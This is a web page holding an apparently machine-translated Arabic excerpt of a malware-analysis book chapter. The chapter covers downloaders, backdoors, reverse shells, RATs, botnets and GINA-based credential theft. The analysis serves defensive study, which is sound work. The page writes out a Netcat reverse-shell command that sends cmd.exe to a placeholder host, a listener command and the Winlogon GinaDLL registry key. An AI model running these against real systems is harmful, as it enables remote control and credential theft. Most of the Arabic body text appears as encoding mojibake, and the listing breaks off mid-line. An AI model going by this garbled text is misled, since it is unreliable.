<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>๐ ๐ง๐ฟ ๐ ูุชุงุจ "ุณูุธูุฑ ุชุดุฑูุญ ุงูุฌุซุฉ!" ุชุญููู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุงูุนูููุฉ ยป ๐จ๐ฟโ๐ซ ๐ข ๐</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ูุดุจู ุชุญููู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ูุนุจุฉ ุงููุท ูุงููุฃุฑ: ูุง ุชูุฌุฏ ููุงุนุฏ ุ ูุฅู ุงููุถุน ูุชุบูุฑ ุจุงุณุชูุฑุงุฑ. ูุฐูู ุ ูู ูุฐู ุงูุญุงูุฉ ุ ูู ุงูููุทูู ุฏุฑุงุณุฉ ุงูุฃุดูุงุก ูุงูุฎูุงุฑุฒููุงุช ุงูุฎ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ูุชุงุจ "ุณูุธูุฑ ุชุดุฑูุญ ุงูุฌุซุฉ!" ุชุญููู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุงูุนูููุฉ ยป</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/piter/blog/416143/" style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u="><img src="https://habrastorage.org/webt/jk/0g/rv/jk0grvjx0tqi91gqj9v6qmsqahs.jpeg" align="left" alt="ุงูุตูุฑุฉ"></a>  ูุดุจู ุชุญููู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ูุนุจุฉ ุงููุท ูุงููุฃุฑ: ูุง ุชูุฌุฏ ููุงุนุฏ ุ ูุฅู ุงููุถุน ูุชุบูุฑ ุจุงุณุชูุฑุงุฑ.  ูุฐูู ุ ูู ูุฐู ุงูุญุงูุฉ ุ ูู ุงูููุทูู ุฏุฑุงุณุฉ ุงูุฃุดูุงุก ูุงูุฎูุงุฑุฒููุงุช ุงูุฎุงูุฏุฉ ููุท.  ุจูุฌุฑุฏ ููุงุฌูุฉ ูููุฉ ุญูุงูุฉ ุงูุดุจูุฉ (ุฃู ุฃูู ุดุจูุฉ) ุ ุณุชูุชูู ุฅูู ูุฐุง ุงูุชุญููู ุ ููุง ููููู ุจุจุณุงุทุฉ ุงูุงุณุชุบูุงุก ุนู ูุฐุง ุงููุชุงุจ. <br><br><h3 style=";text-align:right;direction:rtl">  ุจุฑุงูุฌ ุชูุฒูู ูุชุดุบูู ุงูุจุฑุงูุฌ </h3><br>  ููุงู ููุนุงู ูู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุงูุชู ูุชู ุงูุชุดุงููุง ุจุดูู ูุชูุฑุฑ ููุตููุฉ ูุชูุฒูู ุงูุจุฑุงูุฌ ูุชุดุบูููุง.  ุงูุชูุฒููุงุช (ูุฌุจ ุนุฏู ุงูุฎูุท ุจููู ูุจูู ุชูุฒููุงุช ุงููุธุงู) ุจุจุณุงุทุฉ ุชูุฒูู ููุฏ ุถุงุฑ ุฅุถุงูู ูู ุงูุฅูุชุฑูุช ูุชุดุบููู ุนูู ุฌูุงุฒ ููุจููุชุฑ ูุญูู.  ููุซูุฑุง ูุง ูุชู ุชูุฒูุนูุง ูุน ุงุณุชุบูุงู.  ุนุงุฏุฉู ูุง ูุณุชุฎุฏููู ููุงููุชูู ููุงุฌูุฉ ุจุฑูุฌุฉ ุชุทุจููุงุช Windows ุ ูุงุญุฏุฉ ุชูู ุงูุฃุฎุฑู ุ ูุชูุฒูู ุจุฑุงูุฌ ุถุงุฑุฉ ุฅุถุงููุฉ ูุชูููุฐูุง: URLDownloadtoFileA ู WinExec. <br><a name="habracut"></a><br>  Launcher (launcher) ูู ููู ูุงุจู ููุชูููุฐ ูููู ุจุชุซุจูุช ุงูุชุทุจููุงุช ุงูุถุงุฑุฉ ูุชูููุฐูุง ุงููุฎูู (ุนูู ุงูููุฑ ุฃู ุจุนุฏ ูุฑูุฑ ุจุนุถ ุงูููุช).  ุบุงูุจูุง ูุง ุชุฃุชู ูุงุฐูุงุช ูุน ุงูุจุฑูุงูุฌ ุงูุฐู ูุญุชุงุฌููู ูุชุดุบููู.  ุณููุงูุดูุง ูู ุงููุตู 12. <br><br><h4 style=";text-align:right;direction:rtl">  ุฃุจูุงุจ ุฎูููุฉ </h4><br>  ุงูุฃุจูุงุจ ุงูุฎูููุฉ ูู ุจุฑุงูุฌ ุชุชูุญ ููููุงุฌู ุงููุตูู ุฅูู ููุจููุชุฑ ุงูุถุญูุฉ.  ููู ุฃูุซุฑ ุฃููุงุน ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุงูุชู ูููู ุงูุชุดุงููุง ุ ููููู ุฃู ูุฎุชูู ุญุฌููุง ููุฌููุนุฉ ููุฒุงุชูุง ุจุดูู ูุจูุฑ.  ุนุงุฏุฉู ูุง ูููู ุฑูุฒ ุงูุจุงุจ ุงูุฎููู ููุชูููุง ุฐุงุชููุง ููุง ูุชุทูุจ ุชูุฒูู ูููุงุช ูุตุงุจุฉ ุฅุถุงููุฉ. <br><br>  ุชุชูุงุนู ุงูุฃุจูุงุจ ุงูุฎูููุฉ ุนุจุฑ ุงูุฅูุชุฑูุช ุจุนุฏุฉ ุทุฑู ูุฎุชููุฉ ุ ูููู ุนุงุฏุฉู ูุง ูุชู ููู ุงูุจูุงูุงุช ุนุจุฑ HTTP ูู ุฎูุงู ุงููููุฐ 80. ูุดูู HTTP ูุนุธู ุญุฑูุฉ ูุฑูุฑ ุงูุดุจูุฉ ุงูุตุงุฏุฑุฉ ุ ููุง ูููุญ ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ูุฑุตุฉ ูุจูุฑุฉ ูุชุชุฌุงูู ุฎูููุฉ ุงููุนูููุงุช ุงูุฃุฎุฑู. <br><br>  ูู ุงููุตู 14 ุ ุณุชุชุนูู ููููุฉ ุชุญููู ุงูุฃุจูุงุจ ุงูุฎูููุฉ ุนูู ูุณุชูู ุงูุญุฒูุฉ ุ ูุฅูุดุงุก ุชูููุนุงุช ูุนุงูุฉ ููุดุจูุฉ.  ูู ุบุถูู ุฐูู ุ ุณูุฑูุฒ ุนูู ุงูุชูุงุนู ุนุงูู ุงููุณุชูู. <br>  ุชุฃุชู ุงูุฃุจูุงุจ ุงูุฎูููุฉ ูุน ูุฌููุนุฉ ููุงุณูุฉ ูู ุงููุธุงุฆู: ุงููุฏุฑุฉ ุนูู ูุนุงูุฌุฉ ููุงุชูุญ ุงูุชุณุฌูู ุ ูุญุณุงุจ ุงูููุงูุฐ ุงููุนุฑูุถุฉ ุ ูุฅูุดุงุก ุงูุฏูุงุฆู ุ ูุงูุจุญุซ ุนู ุงููููุงุช ุ ููุง ุฅูู ุฐูู. ูููู ุฃู ูู ูุฐู ุงููุธุงุฆู ูุณุชุฎุฏููุง ุงูุจุงุจ ุงูุฎููู ุ ููููู ุงูุชุญูู ูู ูุธุงุฆู Windows API ุงูุชู ุชุณุชูุฑุฏูุง.  ููุฏู ุงูููุญู ุฃ ูุงุฆูุฉ ุจุงููุธุงุฆู ุงูุดุงุฆุนุฉ ุงูุชู ุชุตู ูุง ูููููู ูููู ุนู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ. <br><br><h3 style=";text-align:right;direction:rtl">  ุนูุณ ุงูุฃูุงูุฑ ุดู </h3><br>  shell ุฃูุฑ ุนูุณู ูู ุงุชุตุงู ูููู ุจุจุฏุก ุชุดุบูู ุฌูุงุฒ ููุจููุชุฑ ูุตุงุจ ุ ููุง ูููุญ ุงูุฃูุฑ ูุตููุงู ุฅูู ููุงุฌู.  ูููู ุฃู ูููู ุฅูุง ุจุฑูุงูุฌูุง ุถุงุฑูุง ูููุตูุงู ุ ุฃู ุฃุญุฏ ููููุงุช ุจุงุจ ุฎููู ุฃูุซุฑ ุชุนููุฏูุง.  ุฃุซูุงุก ูุฌูุฏู ูู ุบูุงู ุงูุฃูุงูุฑ ุงูุนูุณู ุ ูููู ููููุงุฌู ุชูููุฐ ุงูุฃูุงูุฑ ููุง ูู ูุงู ูู ูุฐุง ูุญุฏุซ ุนูู ูุธุงูู ุงููุญูู. <br><br><h4 style=";text-align:right;direction:rtl">  Netcat ุนูุณ ุงูุฃูุงูุฑ ุดู </h4><br>  ูููู ุงุณุชุฎุฏุงู ุจุฑูุงูุฌ Netcat ุงูุฐู ูุงูุดูุงู ูู ุงููุตู 3 ูุฅูุดุงุก ุบูุงู ุฃูุงูุฑ ุฅุฐุง ููุช ุจุชุดุบููู ุนูู ุฌูุงุฒู ููุจููุชุฑ.  ุบุงูุจูุง ูุง ูุณุชุฎุฏูู ุงูููุงุฌููู ุจุฃููุณูู ุ ูููููููู ุจุจุฑุงูุฌ ุถุงุฑุฉ ุฃุฎุฑู. <br>  ูุงุณุชุฎุฏุงู Netcat ุนูู ูุฐุง ุงููุญู ุ ูุฌุจ ุฃู ููุชุธุฑ ุงููุธุงู ุงูุจุนูุฏ ุงูุงุชุตุงูุงุช ุงููุงุฑุฏุฉ ุจุงุณุชุฎุฏุงู ุงูุฃูุฑ ุงูุชุงูู: <br><br><pre style=";text-align:right;direction:rtl"><code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nc</span></span> -l โp <span class="hljs-number"><span class="hljs-number">80</span></span></code> </pre> <br>  ูููู ุงููุญูู -l ุจุชุญููู Netcat ุฅูู ูุถุน ุงูุงุณุชูุงุน ุ ููุญุฏุฏ ุงูููุชุงุญ -p ุงููููุฐ ุงูุฐู ุชุชู ูุฑุงูุจุชู.  ุจุนุฏ ุฐูู ุ ูุจุฏุฃ ุฌูุงุฒ ุงูููุจููุชุฑ ุงูุฎุงุต ุจุงูุถุญูุฉ ุงุชุตุงูุงู ุตุงุฏุฑูุง ููููุฑ ุบูุงู ุงูุฃูุงูุฑ ุงูุฎุงุต ุจู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="hljs dos">nc _ip <span class="hljs-number"><span class="hljs-number">80</span></span> -e <span class="hljs-built_in"><span class="hljs-built_in">cmd</span></span>.exe</code> </pre> <br>  ip 80 listener ูู ุนููุงู IP ููููุฐ ุงููุถูู ุงูุจุนูุฏ.  ูุชูุญ ูู ุงูุฎูุงุฑ -e ุชุญุฏูุฏ ุงูุจุฑูุงูุฌ ุงูุฐู ุณูุชู ุชุดุบููู ุนูุฏ ุฅูุดุงุก ุงูุงุชุตุงู.  ุณูุชู ุฑุจุท ุงููุฏุฎูุงุช ูุงููุฎุฑุฌุงุช ุงูููุงุณูุฉ ุจุงูููุจุณ (ููุง ุณุชุฑู ูุงุญููุง ุ ุบุงูุจูุง ูุง ูุณุชุฎุฏู Windows cmd.exe). <br><br><h4 style=";text-align:right;direction:rtl">  ุนูุณ ุงูููุงูุฐ </h4><br>  ูุณุชุฎุฏู ุงูููุงุฌููู ุนูููุชู ุชุทุจูู shell ุฃูุฑ ุนูุณู ุจุณูุทุชูู ุชุณุชูุฏ ุฅูู cmd.exe ูู Windows: ุฃุณุงุณู ููุชุนุฏุฏ ุงูุฎููุท. <br><br>  ุชุนุชุจุฑ ุงูุทุฑููุฉ ุงูุฃุณุงุณูุฉ ุดุงุฆุนุฉ ุจูู ูุคููู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุ ูุธุฑูุง ูุฃููุง ุฃุณูู ูู ุงูุชูููุฐ ููุง ุชุนูู ุจุดูู ุนุงู ุจุดูู ุฃุณูุฃ ูู ุงูููุฌ ูุชุนุฏุฏ ุงูุฎููุท.  ููู ูุนุชูุฏ ุนูู ุงุณุชุฏุนุงุก CreateProcess ูุชุบููุฑ ุจููุฉ STARTUPINFO ุงูุชู ูุชู ุชูุฑูุฑูุง ุฅูููุง.  ุฃููุงู ุ ูุชู ุฅูุดุงุก ูุฃุฎุฐ ุชูุตูู ูุฅูุดุงุก ุงุชุตุงู ูุน ุงูุฎุงุฏู ุงูุจุนูุฏ.  ุซู ูุชู ุชูุตูู ูุฐุง ุงูููุจุณ ุจุงูุฎููุท ุงูููุงุณูุฉ (ุงูุฅุฏุฎุงู ูุงูุฅุฎุฑุงุฌ ูุฏูู ุงูุฎุทุฃ) ูุนูููุฉ cmd.exe.  ูููู CreateProcess ุจุชุดุบูู cmd.exe ูู ูุถุน ุจุฏูู ููุงูุฐ ูุฅุฎูุงุฆู ุนู ุงูุถุญูุฉ.  ูุนุทู ุงููุตู 7 ูุซุงูุงู ุนูู ูุฐู ุงูุชูููุฉ. <br><br>  ูุชุถูู ุงูุฅุตุฏุงุฑ ูุชุนุฏุฏ ุงูุฎููุท ูู ุฃูุฑ ุงูุฃูุงูุฑ ุงูุนูุณู ูู Windows ุฅูุดุงุก ูุฃุฎุฐ ุชูุตูู ูููุงุณุฑูู ููุคุดุฑูู (ูุฐูู ุ ูุฌุจ ุนููู ุงูุจุญุซ ุนู ููุงููุงุช CreateThread ู CreatePipe).  ูุณุชุฎุฏู ูุคููู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ูุฐู ุงูุทุฑููุฉ ุฃุญูุงููุง ูุฌุฒุก ูู ุฅุณุชุฑุงุชูุฌูุฉ ูุชุนุฏูู ุฃู ุชุฑููุฒ ุงูุจูุงูุงุช ุงููุฑุณูุฉ ุนุจุฑ ูุฃุฎุฐ ุชูุตูู.  ูููู ุงุณุชุฎุฏุงู ูุธููุฉ CreatePipe ููุฑุจุท ุจููุงุฉ ุงููุฑุงุกุฉ ูุงููุชุงุจุฉ ุ ูุซู ุงูุฅุฏุฎุงู ุงูููุงุณู (stdin) ูุงูุฅุฎุฑุงุฌ ุงูููุงุณู (stdout).  ุชุชูุญ ูู ูุธููุฉ CreateProcess ุฑุจุท ุณูุงุณู ุงูุฑุณุงุฆู ุงูููุงุณูุฉ ุจููุงุฉ ุ ูููุณ ุฑุจุทูุง ูุจุงุดุฑุฉ ุจููุจุณ.  ุจุนุฏ ุฃู ูุชู ุงุณุชุฏุนุงุคูุง ุ ุณุชูุดุฆ ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุฎูุทูู ูู ุงูุชูููุฐ: ุฃุญุฏููุง ูููุฑุงุกุฉ ูู ููุงุฉ stdin ูุงููุชุงุจุฉ ุฅูู ุงูููุจุณ ุ ูุงูุขุฎุฑ ูููุฑุงุกุฉ ูู ุงูููุจุณ ูุงููุชุงุจุฉ ุฅูู ููุงุฉ stdout.  ุนุงุฏุฉู ุ ุชููู ูุฐู ุงูุณูุงุณู ุนุจุงุฑุฉ ุนู ุจูุงูุงุช ุชุฑููุฒ ุ ูุงูุชู ุณููุงูุดูุง ูู ุงููุตู 13. ุจุงุณุชุฎุฏุงู ุทุฑู ุงูููุฏุณุฉ ุงูุนูุณูุฉ ุ ููููู ูุญุต ุงููุฑูุน ุงูุชู ุชููู ูููุง ุงูุฌุฏุงูู ุจูู ุชุดููุฑ ุงูุญุฒู ุงูุชู ุชู ุชููููุง ุฃุซูุงุก ุฌูุณุฉ ูุดูุฑุฉ. <br><br><h3 style=";text-align:right;direction:rtl">  ุฃุฏูุงุช ุงูุฅุฏุงุฑุฉ ุนู ุจุนุฏ </h3><br>  ูุชู ุงุณุชุฎุฏุงู ุฃุฏูุงุช ุงูุฅุฏุงุฑุฉ ุนู ุจุนุฏ (RATs) ููุชุญูู ูู ุฌูุงุฒ ููุจููุชุฑ ุฃู ุฃุฌูุฒุฉ ููุจููุชุฑ ุนุจุฑ ุดุจูุฉ.  ุบุงูุจูุง ูุง ูุดุงุฑููู ูู ูุฌูุงุช ุฐุงุช ุฃูุฏุงู ุถููุฉ - ุนูู ุณุจูู ุงููุซุงู ุ ุนูุฏ ุณุฑูุฉ ุงููุนูููุงุช ุฃู ุงูุงูุชูุงู ูู ููุจููุชุฑ ุฅูู ุขุฎุฑ. <br><br>  ูู ุงูุดูู.  ููุถุญ 11.1 ุจููุฉ ุดุจูุฉ RAT.  ุงูุฎุงุฏู ุงูุฐู ูุนูู ุนูู ูุธุงู ุงูุถุญูุฉ ูุฌูุฒ ุจุฑูุฒ ุถุงุฑ.  ูุนูู ุงูุนููู ุนู ุจุนุฏ ูุฃู ูุญุฏุฉ ุงูุชุญูู ุชุญุช ุชุตุฑู ุงูููุงุฌู.  ุชุดูุฑ ุงูุฎูุงุฏู ุฅูู ุงูุนููู ุงูุฐู ูุชุญูู ูููุง ูุจุฏุก ุงูุงุชุตุงู.  ูุญุฏุซ ุงูุชุดุบูู ุงูุจููู ูู RAT ุนุงุฏุฉู ูู ุฎูุงู ุงูููุงูุฐ ุงูููุงุณูุฉ ุ ูุซู 80 ุฃู 443. <br><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/kj/7f/px/kj7fpxqhevkd2db817n4rjulxuu.png" alt="ุงูุตูุฑุฉ"></div><br><h3 style=";text-align:right;direction:rtl">  ุงูุฑูุจูุชุงุช </h3><br>  ุดุจูุฉ ุงูุฑูุจูุชุงุช ูู ูุฌููุนุฉ ูู ุนูุฏ ุงูุดุจูุฉ ุงููุตุงุจุฉ (ุงููุณุงูู) ุงูุชู ุชุชู ุฅุฏุงุฑุชูุง ูุฑูุฒููุง ุ ูุนุงุฏุฉ ูุง ุชุณุชุฎุฏู ุฎุงุฏููุง ูุณูู ูุญุฏุฉ ุชุญูู ุจูุช ูุช.  ุงููุฏู ูู ุงูุฑูุจูุชุงุช ูู ุฅุตุงุจุฉ ุฃูุจุฑ ุนุฏุฏ ูููู ูู ุฃุฌูุฒุฉ ุงูููุจููุชุฑ ูุฅูุดุงุก ุดุจูุฉ ูุงุณุนุฉ ุงููุทุงู ุจูุงุกู ุนูููุง ูููู ุงุณุชุฎุฏุงููุง ููุดุฑ ูู ูู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุฃู ุงูุจุฑูุฏ ุงูุนุดูุงุฆู ูุชูููุฐ ูุฌูุงุช DDoS (ุฑูุถ ุงูุฎุฏูุฉ ุงูููุฒุน). )  ุฅุฐุง ุจุฏุฃุช ูู ุงููุณุงูู ูู ููุณ ุงูููุช ุจููุงุฌูุฉ ูููุน ูุนูู ุ ููุฏ ูุชุนุฐุฑ ุงููุตูู ุฅููู. <br><br><h3 style=";text-align:right;direction:rtl">  ููุงุฑูุฉ ุจูู RAT ู Botnets </h3><br>  ููุงู ุงูุนุฏูุฏ ูู ุงูุงุฎุชูุงูุงุช ุงููููุฉ ุจูู ุดุจูุงุช ุงูุฑูุจูุช ูุฃุฏูุงุช ุงูุฅุฏุงุฑุฉ ุนู ุจูุนุฏ. <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ูู ุงููุนุฑูู ุฃู ุงูุฑูุจูุชุงุช ุชุตูุจ ููุงููู ุงูุนูุฏ ูุชุชุญูู ูููุง.  ูุชู ุชุดุบูู RATs ุนุงุฏุฉู ุจูุงุณุทุฉ ุนุฏุฏ ุฃูู ูู ุฃุฌูุฒุฉ ุงูููุจููุชุฑ. </li><li style=";text-align:right;direction:rtl">  ุชุชู ุฅุฏุงุฑุฉ ุฌููุน ุงููุดุงุฑููู ูู ุจูุช ูุช ูู ููุช ูุงุญุฏ.  ูุณูุญ ูู RAT ุจุชูุฒูุน ุงูููุงุฑุฏ ุจูู ูุฎุชูู ุงูุถุญุงูุง ุ ูุฃู ุงูููุงุฌู ูุฏูู ุงููุฏุฑุฉ ุนูู ุงูุชูุงุนู ุจุดูู ูุซูู ูุน ุงูุฃูุธูุฉ ุงููุตุงุจุฉ. </li><li style=";text-align:right;direction:rtl">  ุชุณุชุฎุฏู RATs ูู ุงููุฌูุงุช ุฐุงุช ุงูุฃูุฏุงู ุงูุถููุฉ ุ ูู ุญูู ุฃู ุงูุฑูุจูุชุงุช ููุญูุธุฉ ุจุฃุนุฏุงุฏูุง ุงูุถุฎูุฉ. </li></ul><br><h3 style=";text-align:right;direction:rtl">  ุณุฑูุฉ ุฃูุฑุงู ุงุนุชูุงุฏ </h3><br>  ุบุงูุจูุง ูุง ูุฐูุจ ุงูููุงุฌููู ุฅูู ุฌููุน ุฃููุงุน ุงูุญูู ูุณุฑูุฉ ุฃูุฑุงู ุงูุงุนุชูุงุฏ.  ููุทุจู ูุฐุง ุจุดูู ุฎุงุต ุนูู ุงูุฃููุงุน ุงูุซูุงุซุฉ ูู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ. <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุงูุจุฑุงูุฌ ุงูุชู ุชุณุฑู ุจูุงูุงุช ุงุนุชูุงุฏ ุงููุณุชุฎุฏู ูู ุงููุญุธุฉ ุงูุชู ูููู ูููุง ุจุชุณุฌูู ุงูุฏุฎูู ุฅูู ุงููุธุงู. </li><li style=";text-align:right;direction:rtl">  ุงูุจุฑุงูุฌ ุงูุชู ุชูุณุฎ ุงููุนูููุงุช ุงููุฎุฒูุฉ ูู Windows (ูููุงุช ุงููุฑูุฑ ุ ุงูุชุฌุฒุฆุฉ ุ ุฅูุฎ) ููุงุณุชุฎุฏุงู ุงููุจุงุดุฑ ุฃู ูุฒูุฏ ูู ูู ุงูุชุดููุฑ. </li><li style=";text-align:right;direction:rtl">  ุงูุจุฑุงูุฌ ุงูุชู ุชุณุฌู ุถุฑุจุงุช ุงูููุงุชูุญ. </li></ul><br>  ูู ูุฐุง ุงููุณู ุ ุณูููู ูุธุฑุฉ ุนูู ูู ูู ูุฐู ุงูุฃููุงุน ูู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ. <br><br><h3 style=";text-align:right;direction:rtl">  ุงุนุชุฑุงุถ ุฌููุง </h3><br>  ูุณุชุฎุฏู ูุธุงู ุงูุชุดุบูู Windows XP ุฎุฏุนุฉ ูุณุฑูุฉ ุจูุงูุงุช ุงูุงุนุชูุงุฏ ุ ูุงูุชู ุชุชูุซู ูู ุงุนุชุฑุงุถ GINA (ุชุนุฑูู ุฑุณููู ููุตุงุฏูุฉ).  ุชู ุฅูุดุงุก ูุธุงู GINA ููุณูุงุญ ูุชุทุจููุงุช ุงูุทุฑู ุงูุซุงูุซ ุจุชูููู ุนูููุฉ ุชุณุฌูู ุงูุฏุฎูู ูุฃููุณูู ุ ูุฅุถุงูุฉ ุฏุนู ูุชูููุงุช ูุซู ุชุญุฏูุฏ ุงูุชุฑุฏุฏุงุช ุงููุงุณูููุฉ (RFID) ุนูู ุฃุณุงุณ ุงูุฑููุฒ ุงููููุฒุฉ ุฃู ุงูุจุทุงูุงุช ุงูุฐููุฉ.  ููุชูุฒ ูุคููู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ูุฐู ุงููุฑุตุฉ ูุชูุฒูู ุงูุดูุฑุฉ ุงูุชู ุชุณุฑู ุจูุงูุงุช ุงูุงุนุชูุงุฏ. <br><br>  ูุชู ุชูููุฐ GINA ูููู DLL ูุณูู msgina.dll ููุชู ุชุญูููู ุจูุงุณุทุฉ Winlogon ุฃุซูุงุก ุชุณุฌูู ุงูุฏุฎูู.  ูุฏุนู Winlogon ุฃูุถูุง ุงูููููุงุช ุงูุฅุถุงููุฉ ููุฌูุงุช ุงูุฎุงุฑุฌูุฉ ุ ูุชุญููููุง ุฃูุงู DLL GINA (ููุง ูู ุงูุญุงู ูู ูุฌูู ูุณูุท).  ูุชูููุฑ ุงูุฑุงุญุฉ ุ ูููุฑ Windows ูุฑุน ุงูุชุณุฌูู ุงูุชุงูู ุ ุญูุซ ูููู ูู Winlogon ุงูุนุซูุฑ ุนูู ูููุงุช DLL ุงูุฎุงุตุฉ ุจุฌูุงุช ุฃุฎุฑู ูุชุญููููุง: <br><br><pre style=";text-align:right;direction:rtl"> <code class="hljs tex">HKLM<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SOFTWARE</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Microsoft</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span> NT<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">CurrentVersion</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Winlogon</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">GinaDLL</span></span></span></span></code> </pre> <br>  ุจูุฌุฑุฏ ุงูุนุซูุฑ ุนูู ููู fsgina.dll ูุตุงุจ ููุงู ุ ูุงูุฐู ุชุจูู ุฃูู ุงุนุชุฑุงุถ GINA. <br>  ูู ุงูุดูู.  ููุธูุฑ ุงูุดูู 11.2 ูุซุงูุงู ุนูู ููููุฉ ูุตูู ูุนูููุงุช ุชุณุฌูู ุงูุฏุฎูู ุฅูู ููุชุจุฉ ุถุงุฑุฉ ุ ุญูุซ ุชูุชูู ูู Winlogon ุฅูู msgina.dll.  ุชููู ุงูุจุฑูุงูุฌ ุงูุถุงุฑ (fsgina.dll) ูู ุงุนุชุฑุงุถ ุฌููุน ุจูุงูุงุช ุงูุงุนุชูุงุฏ ุงูุชู ูุฏุฎููุง ุงููุณุชุฎุฏู ุฃุซูุงุก ุงููุตุงุฏูุฉ.  ููููู ูุชุงุจุชูุง ุนูู ุงููุฑุต ุฃู ููููุง ุนุจุฑ ุงูุดุจูุฉ. <br><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ge/eh/ma/geehmaneqdvfmxkmq9-8drvs5cc.png" alt="ุงูุตูุฑุฉ"></div><br>  ูุธุฑูุง ูุฃู ููุชุจุฉ fsgina.dll ุชุนุชุฑุถ ุชุฏูู ุงูุชูุงุนู ุจูู Winlogon ู GINA ุ ูุฌุจ ุฃู ุชูุฑุฑูุง ุฅูู msgina.dll ุจุดูู ุฃูุจุฑ ุญุชู ูุณุชูุฑ ุงููุธุงู ูู ุงูุนูู ุจุดูู ุทุจูุนู.  ููููุงู ุจุฐูู ุ ูุฌุจ ุนูู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุชุตุฏูุฑ ุฌููุน ุงููุธุงุฆู ุงูุชู ูุชุทูุจูุง ูุธุงู GINA - ููุงู ุฃูุซุฑ ูู 15 ูููุง ุ ููุนุธููุง ูุฏูู ุจุงุฏุฆุฉ Wlx.  ูู ุงููุงุถุญ ุ ุฅุฐุง ูุฌุฏุช ูู DLL ุงูุนุฏูุฏ ูู ูุธุงุฆู ุงูุชุตุฏูุฑ ุงูุชู ุชุจุฏุฃ ุจู Wlx ุ ููููู ุนูู ุงูุฃุฑุฌุญ ุงูุชุฑุงุถ ุฃู ูุฐุง ูู ุงุนุชุฑุงุถ GINA. <br><br>  ุชุตู ูุนุธู ููุงููุงุช ุงูุชุตุฏูุฑ ูุฐู ุฅูู ูุธุงุฆู ุญููููุฉ ุฏุงุฎู msgina.dll.  ูู ุญุงูุฉ fsgina.dll ุ ููุทุจู ูุฐุง ุนูู ุฌููุน ุงููุธุงุฆู ุจุงุณุชุซูุงุก WlxLoggedOutSAS.  ููุธูุฑ ุงูุฅุฏุฑุงุฌ 11.1 ุชุตุฏูุฑ WlxLoggedOutSAS ุฅูู fsgina.dll. <br><br>  ูุงุฆูุฉ 11.1.  ุฏุงูุฉ ุชุตุฏูุฑ WlxLoggedOutSAS ูู DLL GINA ุงูุชู ุชุณุฌู ุฃูุฑุงู ุงูุงุนุชูุงุฏ ุงููุณุฑููุฉ <br><br><pre style=";text-align:right;direction:rtl"> <code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100014</span></span>A0 WlxLoggedOutSAS <span class="hljs-number"><span class="hljs-number">100014</span></span>A0 push esi <span class="hljs-number"><span class="hljs-number">100014</span></span>A1 push edi <span class="hljs-number"><span class="hljs-number">100014</span></span>A2 push 